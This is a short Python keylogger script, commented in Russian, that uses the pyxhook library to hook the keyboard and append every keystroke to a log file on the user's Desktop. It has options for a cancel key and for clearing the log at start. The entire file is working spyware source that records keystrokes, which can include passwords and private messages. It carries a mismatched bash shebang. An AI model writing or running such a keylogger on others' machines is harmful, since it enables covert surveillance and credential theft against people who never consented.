#! /bin/bash

import os
import pyxhook

log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/keylogger_file.log'))  # куда я записываю логи
cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])  # разрешить установку ключа отмены из аргументов среды

if os.environ.get('pylogger_clean', None) is not None:  # очистка файла журнала при запуске, если определен pylogger_clean.
	try:
		os.remove(log_file)
	except EnvironmentError:
		pass  # если файл не существует или нет прав

def KeyPress(event):  # создание события нажатий клавиш и сохранение его в файл
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(event.Key))

# создание объекта по менеджеру ловушек для отдельных кнопок
new_hook = pyxhook.HookManager()
new_hook.KeyDown = KeyPress
# установка ловушки
new_hook.HookKeyboard()
try:
	new_hook.start()		 # старт ловушки
except KeyboardInterrupt:  # убираем пользовтелья из команднйо строки
	pass

except Exception as ex:  # записывать исключения в файл журнала для последующего анализа
	msg = 'Error while catching events:\n {}'.format(ex)
	pyxhook.print(msg)
	with open(log_file, 'a') as f:
		f.write('\n{}'.format(msg))
